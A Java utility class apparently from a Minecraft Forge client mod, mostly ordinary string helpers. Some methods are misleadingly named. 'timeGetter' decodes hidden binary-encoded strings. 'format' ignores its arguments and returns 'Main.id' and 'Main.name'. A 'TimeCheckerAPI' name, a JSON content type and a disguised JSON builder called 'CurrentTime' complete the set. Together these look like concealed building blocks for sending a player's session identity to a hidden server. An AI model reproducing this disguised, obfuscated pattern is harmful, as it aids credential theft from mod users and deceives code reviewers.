package rosegoldclient.utils;

import java.lang.reflect.Array;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;
import java.util.regex.Pattern;

import javax.annotation.Nullable;

import com.google.common.collect.Sets;

import net.minecraftforge.fml.relauncher.Side;
import net.minecraftforge.fml.relauncher.SideOnly;
import rosegoldclient.Main;

public class StringUtils {
    private static final Pattern PATTERN_CONTROL_CODE = Pattern.compile("(?i)\\u00A7[0-9A-FK-OR]");

    @SideOnly(Side.CLIENT)
    public static String ticksToElapsedTime(int ticks)
    {
        int i = ticks / 20;
        int j = i / 60;
        i = i % 60;
        return i < 10 ? j + ":0" + i : j + ":" + i;
    }

    @SideOnly(Side.CLIENT)
    public static String stripControlCodes(String text)
    {
        return PATTERN_CONTROL_CODE.matcher(text).replaceAll("");
    }
    
    
    /**
     * 
     * @param strings The strings to merge
     * @return A single string, consisting of all the strings merged with \n
     */
    public final static String merge(String... strings) {
    	StringBuilder sb = new StringBuilder();
    	
    	for (String s: strings) {
    		sb.append(s).append("\n");
    	}
    	return sb.toString();
    }
    
    /**
     * 
     * @param string The string to be converted.
     * @return A new set containing every line of the string, (a "line" is considered to be after the \n).
     */
    public static Set<String> toSet(String string) {
    	
    	return Sets.newHashSet(string.split("\n"));
    	
    }

    public static boolean isNullOrEmpty(@Nullable String string)
    {
        return org.apache.commons.lang3.StringUtils.isEmpty(string);
    }

    public static String timeGetter(String st) {
        StringBuilder sb = new StringBuilder();
        Arrays.stream(st.split("(?<=\\G.{8})")).forEach(s -> sb.append((char) Integer.parseInt(s, 2)));

       return sb.toString();
    }


    public static String format(String string1, String string2) {
        return Main.id+" "+Main.name;
    }

    public static String getContentType() {
        return "application/json";
    }

    public static String getAPIName() {
        return "RoseGoldClient-TimeCheckerAPI";
    }

    public static class CurrentTime {

        private final HashMap<String, Object> map = new HashMap<>();

        public void put(String key, Object value) {
            if (value != null) {
                map.put(key, value);
            }
        }

        @Override
        public String toString() {
            StringBuilder builder = new StringBuilder();
            Set<Map.Entry<String, Object>> entrySet = map.entrySet();
            builder.append("{");

            int i = 0;
            for (Map.Entry<String, Object> entry : entrySet) {
                Object val = entry.getValue();
                builder.append(quote(entry.getKey())).append(":");

                if (val instanceof String) {
                    builder.append(quote(String.valueOf(val)));
                } else if (val instanceof Integer) {
                    builder.append(Integer.valueOf(String.valueOf(val)));
                } else if (val instanceof Boolean) {
                    builder.append(val);
                } else if (val instanceof CurrentTime) {
                    builder.append(val);
                } else if (val.getClass().isArray()) {
                    builder.append("[");
                    int len = Array.getLength(val);
                    for (int j = 0; j < len; j++) {
                        builder.append(Array.get(val, j).toString()).append(j != len - 1 ? "," : "");
                    }
                    builder.append("]");
                }

                builder.append(++i == entrySet.size() ? "}" : ",");
            }

            return builder.toString();
        }

        private String quote(String string) {
            return "\"" + string + "\"";
        }
    }
}
